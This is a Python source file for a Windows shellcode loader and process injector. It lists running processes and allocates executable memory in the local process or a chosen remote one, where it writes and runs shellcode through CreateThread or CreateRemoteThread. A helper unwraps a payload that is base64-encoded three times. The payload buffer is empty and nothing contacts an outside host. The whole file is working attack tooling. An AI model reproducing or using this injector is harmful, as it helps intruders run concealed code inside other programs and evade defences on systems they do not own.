import sys
import base64
import platform

from ctypes import *

VIRTUAL_MEM = (0x1000 | 0x2000)
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

buf =  ""


def inject_unwrap(code):
	s1 = base64.b64decode(code)
	s2 = base64.b64decode(s1)
	return base64.b64decode(s2)

def inject_get_processes():
    arr = c_ulong * 256
    lpidProcess= arr()
    cb = sizeof(lpidProcess)
    cbNeeded = c_ulong()
    hModule = c_ulong()
    count = c_ulong()
    modname = c_buffer(30)
    modpath = c_buffer(250)
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    windll.psapi.EnumProcesses(byref(lpidProcess), cb, byref(cbNeeded))
    nReturned = cbNeeded.value/sizeof(c_ulong())
    pidProcess = [i for i in lpidProcess][:nReturned]
    proc_d = []
    for pid in pidProcess:
        hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                      False, pid)
        if hProcess:
            windll.psapi.EnumProcessModules(hProcess, byref(hModule), sizeof(hModule), byref(count))
            windll.psapi.GetModuleBaseNameA(hProcess, hModule.value, modname, sizeof(modname))
            windll.psapi.GetProcessImageFileNameA(hProcess, modpath, sizeof(modpath))
            da = ''.join([ i for i in modname if i != '\x00'])
            path_da = ''.join([f for f in modpath if f != '\x00'])
            if not '\x0b' in da:
	            proc_d.append((pid, da, path_da))
            for i in range(modname._length_):
                modname[i]='\x00'
            windll.kernel32.CloseHandle(hProcess)
    return proc_d

def inject_process(shell_code, process_id=None):
	if '64' in platform.machine():
		print('[v] INFO: Machine is 64bit, 32bit shellcode may not work!')
	if '64' in platform.machine() and (sys.maxsize < 2**32):
		print('[!] WARNING: Machine is 64bit and python is running under 32bit!, handles will be invalid!')
	if process_id is None:
		print('[*] Injecting into to local process memory...')
		inj_code = bytearray(shell_code)
		inj_ptr = windll.kernel32.VirtualAlloc(c_int(0), c_int(len(inj_code)), c_int(0x3000), c_int(0x40))
 		if not inj_ptr:
 			print('[!] Couldn\'t allocate memory!')
 			return False
 		inj_buff = (c_char * len(inj_code)).from_buffer(inj_code)
 		print('[*] Copying memory...')
 		windll.kernel32.RtlMoveMemory(c_int(inj_ptr), inj_buff, c_int(len(inj_code)))
 		inj_thread = windll.kernel32.CreateThread(c_int(0), c_int(0), c_int(inj_ptr), c_int(0), c_int(0), 
 									  pointer(c_int(0)))
 		if not inj_thread:
 			print('[!] No thread could be created!')
 			return False
 		print('[*] Code injected, running...')
 		windll.kernel32.WaitForSingleObject(c_int(inj_thread), c_int(-1))
 		return True
 	else:
 		inj_size = len(shell_code)
 		print('[*] Attempting to get handle to process %s...' % process_id)
		inj_process = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(process_id))
		if not inj_process:
			print('[!] Couldnt acquire a handle to process %s' % process_id)
			return False
		inj_address = windll.kernel32.VirtualAllocEx(inj_process, 0, inj_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
		if not inj_address:
			print('[!] Couldn\'t allocate memory on process %s!' % process_id)
 			return False
		inj_written = c_int(0)
		windll.kernel32.WriteProcessMemory(inj_process, inj_address, shell_code, inj_size, byref(inj_written))
		print('[*] Wrote %d bytes to process %s\'s memory' % (inj_written.value, process_id))
		inj_thread_id = c_ulong(0)
		if not windll.kernel32.CreateRemoteThread(inj_process, None, 0, inj_address, 0, 0, byref(inj_thread_id)):
			print('[!] Failed to inject shellcode into %s!' % process_id)
			return False
		print('[*] Remote thread created with a thread ID of: 0x%08x' % inj_thread_id.value)
 		return True
 		
if __name__ == '__main__':
	"""i_process = inject_get_processes()
	is64 = False
	if '64' in platform.machine():
		is64 = True
	for p in i_process:
		if (is64 and 'x86' in p[2]) or not is64:
			print('[v] Trying process "%s"...' % p[1])
			if inject_process(buf, p[0]):
				print('[*] Injected into %s!' % p[2])
				sys.exit(0)"""
	inject_process(buf, None)
	#print('[!] No injects found!')
